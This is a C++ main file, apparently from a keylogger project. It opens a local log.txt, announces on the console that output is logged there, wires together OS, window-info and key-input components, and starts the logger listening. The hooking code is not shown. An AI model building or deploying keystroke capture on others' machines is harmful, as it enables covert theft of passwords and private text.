#include <iostream>
#include <memory>
#include <fstream>
#include <cstring>


#include "../include/windows_info.h"
#include "../include/hook_manager.h"
#include "../include/os_manager.h"
#include "../include/key_input.h"
#include "../include/keylogger.h"

std::ofstream openLogFile();
std::unique_ptr<Keylogger> setupKeylogger(std::ofstream& loggerFile);

int main() {
    std::ofstream loggerFile = openLogFile();
    
    std::unique_ptr<Keylogger> logger = setupKeylogger(loggerFile);

    if (!logger) {
        std::cerr << "Failed to set up Keylogger." << std::endl;
        return 1;
    }

    logger->Listen();
    return 0;
}

std::ofstream openLogFile() {
    const char* fileName = "log.txt";

    std::ofstream output_file;
    
    std::cout << "Logging output to " << fileName << std::endl;
    output_file.open(fileName, std::ios_base::app);

    return output_file;
}

std::unique_ptr<Keylogger> setupKeylogger(std::ofstream& loggerFile) {
    std::unique_ptr<OSManager> osManager = std::make_unique<OSManager>();
    std::unique_ptr<WindowInfo> windowInfo = std::make_unique<WindowInfo>();
    std::unique_ptr<KeyInput> keyInput = std::make_unique<KeyInput>(LoggingFormat::Default);

    std::unique_ptr<Keylogger> keylogger = std::make_unique<Keylogger>(std::move(loggerFile), *osManager, *windowInfo, *keyInput);

    return keylogger;
}
